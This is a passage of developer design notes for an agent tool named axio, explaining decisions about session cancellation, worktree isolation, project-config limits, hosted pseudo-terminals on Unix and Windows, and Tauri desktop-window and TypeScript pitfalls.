session tasks are detached so they keep running. Without an explicit shutdown
that answers, a turn asking for approval after the last surface closed waits
forever for a decision nobody can give. Dropping the sender would work by
accident; saying it deliberately is what lets the model get the right feedback.

**Cancellation must not travel the same channel as the work.** A session task
sits inside `run_turn` for the whole turn and would not read a cancel message
until the turn it was meant to interrupt had already finished. It goes through a
token the handle holds, which is the only thing that reaches a turn in flight.

**Isolation must fail loudly, never quietly downgrade.** Falling back to the live
checkout when a worktree cannot be cut hands an agent write access to the files
someone is using — silently, at the moment isolation was most clearly wanted.
Running without a worktree is a choice someone makes, not a consequence of an
error they never saw.

**Not every loosening looks like a permission.** A project config may not set
`worktree.enabled = false` for the same reason it may not set `permissions.allow`:
it moves an agent out of an isolated checkout and into the working tree of anyone
who cloned the repository. The test for a project-settable key is not "is this a
permission" but "could a repository I cloned use this to increase what an agent
can touch".

## Hosted terminals

**Hosting another tool is a windowing capability, not an agent capability.** The
rule everywhere else is that no surface holds something the command line lacks —
and this looks like a violation until you notice the command line is already
inside a terminal, so "run another agent in a pty" there is just running it. The
application provides a terminal because it does not have one. Nothing about what
an *agent* may do differs between the two, which is why this asymmetry is
allowed to exist and no other one is.

**The executable is allowlisted and only arguments are configurable.** "Run
whatever this string says" in a desktop application is remote code execution
wearing the word *preference*.

**A hosted tool must not inherit the session markers of the tool that started
axio.** One that finds them concludes it was launched by a copy of itself and
behaves as a child session. axio may itself have been started by one, so they
are stripped rather than merely not set.

**`NO_COLOR` is stripped here, and set everywhere else.** axio strips colour
from the processes *it* runs because a model reads that output; a hosted tool is
read by a person through a real terminal, and `TERM=dumb` makes its interface
unusable.

**On Windows the launch goes through the command interpreter.** Agent CLIs
installed by npm are `.cmd` shims and `CreateProcess` will not execute one.
AutoRun is skipped, so a registry key set years ago does not run first.

**Drop the slave end of the pair immediately after spawning.** While it is open
the reader never sees EOF, so a tool that exits leaves a thread waiting on a
terminal nobody is attached to.

**Output is bytes, and decoding happens where the whole stream is.** A `read`
lands wherever the kernel decided; decoding each chunk turns any multi-byte
character straddling that boundary into a replacement character, permanently.

**Reads are pulled by cursor; only the signal is pushed.** Something is always
not listening — every webview reload — and a push-only stream loses whatever
arrived then. The write notification carries no bytes, so a listener that missed
one is late rather than out of sync.

**`Notify::notify_waiters` wakes only whoever is already waiting.** The future
has to be created *before* the read it guards, or output landing in the gap
wakes nobody. The cursor is what makes that survivable rather than fatal.

**A submitted line is two writes: the text, then the carriage return.** A tool
that treats one combined chunk as a paste leaves the text sitting on its prompt
unsent, which reads as the agent ignoring you.

**Killing the direct child is not enough.** It is the command interpreter on
Windows and may have started a build on unix. The tree goes.

**Closing a ConPTY blocks until its output pipe drains, and the child exiting
does not break that.** The pump thread is blocked reading that pipe and the
terminal outlives its process, so each waits for the other. Four tests hung on
this. The master is taken out in `Drop` and released on a detached thread —
otherwise closing a terminal hangs whatever thread the click arrived on.

**ConPTY asks where the cursor is before letting the child's output through.**
It writes a cursor-position request and stalls until something answers. A real
terminal answers and so does the emulator in the application; a test reading
bytes into a buffer does not, and the whole stream sits behind the question.

**ConPTY's opening handshake is about forty bytes.** A test that waits for "some
output" is satisfied by terminal setup before the child has written anything,
and then asserts against a buffer holding nothing but setup.

**Output and exit are noticed by two different threads, so waiting for one says
nothing about the other.** The pump reads the pty; a separate waiter sits in
`child.wait()`. A child writes its last byte strictly *before* it exits, so a
test that waits for output and then asserts on status is asserting on a race it
merely usually wins. It won about two runs in three beside the rest of the
workspace, which is the worst possible failure rate: often enough to look
correct, rare enough to be dismissed as flake. Wait for the thing being
asserted.

## The application window

**Tauri picks dev-versus-production from a feature, never from the cargo
profile.** Without `tauri/custom-protocol`, `tauri-build` emits `cfg(dev)` even
under `--release`, the webview loads `devUrl`, and the window shows a connection
refused against localhost with nothing else wrong — it compiles, links, launches
and is simply blank. The Tauri CLI adds the feature during its own build; we
build with plain cargo, so it must be named. This is written down twice because
the second crate to need it shipped without it anyway. The tell is
`cargo:rustc-cfg=dev` in the build output.

**`ui/dist` must exist before the Rust build.** `frontendDist` points at it and
a stale or missing one is embedded silently.

**The TypeScript boundary is generated, and the test run is what generates it.**
ts-rs writes it during `cargo test`, so a Rust change with no regeneration shows
up as a dirty tree; `git diff --exit-code` on that directory is the drift check.

**`u64` becomes `bigint` unless told otherwise, and that would be wrong here.**
Tauri's IPC is JSON, so what actually arrives is a JS number. Generation caught
this on its first run, on a field a hand-written mirror had been declaring as
`number` for as long as it existed.

**A Tauri command without `async` runs on the thread that paints.** Not a
performance note — a synchronous command doing a process probe, a teardown spin
or a per-keystroke write freezes the window for its duration, and nothing in the
code says so.

**Window controls are a command, not a capability.** Granting the close
permission lets any script in the webview close the window. Routing it through
one command keeps a place that can refuse, which is what a close guard needs in
order to exist. Closing runs that guard and destroying skips it, so only
something that has already dealt with the running work may reach for the second.

**A `beforeunload` listener does not fire for a taskbar close or Alt+F4.** Both
guards are native, and the second needs `Builder::build` followed by
`app.run(closure)`; `.run(context)` cannot intercept it.

**Nothing in the state layer may link Tauri.** That is what keeps the whole
surface behind the glass exercisable by ordinary unit tests with no webview, and
it is the enforcement mechanism for "Rust owns all state": logic that has to
compile without Tauri cannot quietly become a TypeScript store.

**A command no caller reaches is not a capability.** Two shipped that way — one
to start a session, one to stop a hosted terminal — and both looked complete
from the Rust side, where the command exists, is registered, and has a passing
test. Neither had a button. The check is which side of the boundary the *caller*
is on.

**The DOM's globals are in scope in every TypeScript file.** `close`, `name`,
`status`, `origin`, `focus` and `length` are all `Window` members, so a local
that fails to get declared does not error as an unknown name — it silently binds
to the global and surfaces later as a confusing type or arity complaint. A stop
handler named `close` reported `Expected 0 arguments, but got 1`, which is
`window.close`'s signature talking.
